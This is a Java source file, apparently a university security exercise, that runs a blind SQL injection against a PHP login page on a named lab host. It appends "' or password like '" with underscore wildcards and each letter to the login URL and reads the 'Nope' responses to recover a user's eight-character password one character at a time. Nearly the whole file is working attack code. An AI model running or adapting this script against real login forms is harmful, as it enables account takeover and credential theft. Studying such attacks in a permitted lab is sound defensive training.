import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.net.URLConnection;

public class PasswordFinder {
	
	private String username, password, underscore, url, pageText;
	private static String[] alphabet = {"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"};
	private int counter;
	private static String injection = "' or password like '"; //injection which exploits bug in SQL

	/* Sets password to empty and specifies the url which I am going to attack
	*  the password is 8 characters in length so the attack is iterated 8 times
	*/
	public PasswordFinder(String username){
		
		this.username = username;
		
		password = "";
		counter = 0; 
		url = "http://st223.dcs.kcl.ac.uk:8080/osc2/tin.php?username="+username+"&password=somepassword"; //url which I was given permission to attack
	
		for(int i = 0; i < 8; i++){
			wildCards();
			checker();	
		}		
	}

	//checks if the password is correct
	public void checker(){
		
		boolean result = false;
		
		for(int j = 0; j < 26; j++){
            //tries every possible letter to find the next correct letter
			String testURL = url+injection+underscore+alphabet[j]+"%";

			try {
				connectTo(testURL);
			} catch (URISyntaxException e) {

				e.printStackTrace();
			}

			//nope is what the page shows if the password entered is not correct
		if(pageText.equals("Nope") || pageText.equals("-1") || pageText.equals("Nope-1")){
			result = false;
		} else { 
			result = true;
			addToPW(alphabet[j]); //adds correct character to other known characters to form the complete password
			counter++;	
		}
		}
	}
	
	//connects to the page using it's URL and reads it.
	public void connectTo(String url) throws URISyntaxException{
		try {
		    URL target = new URL(url);
		    URI targeturi = new URI(target.getProtocol(), target.getUserInfo(), target.getHost(), target.getPort(), target.getPath(), target.getQuery(), target.getRef());
		    target = new URL(targeturi.toASCIIString());
		    URLConnection connection = target.openConnection();
		    connection.connect();
		    readPage(connection);
		    
		} catch (MalformedURLException e) { 
		} catch (IOException e) {}
		
		
	}

	//extracts text on the page
	public void readPage(URLConnection uc ) throws IOException{
		
		BufferedReader bf = new BufferedReader(new InputStreamReader(uc.getInputStream()));
		String text;
		 
		while ((text = bf.readLine()) != null) 
		pageText = text;
		bf.close();
	}
	
	//concatenates a new character to what the code currently believes the password is
	public void addToPW(String addition){
		password = password+addition;
	}
	
	public void wildCards(){
		underscore = "";
		for(int k = 0; k < counter; k++){
			underscore = underscore+"_";
		}
	}

	//returns password
	public String getPassword(){
		return password;
	}

}
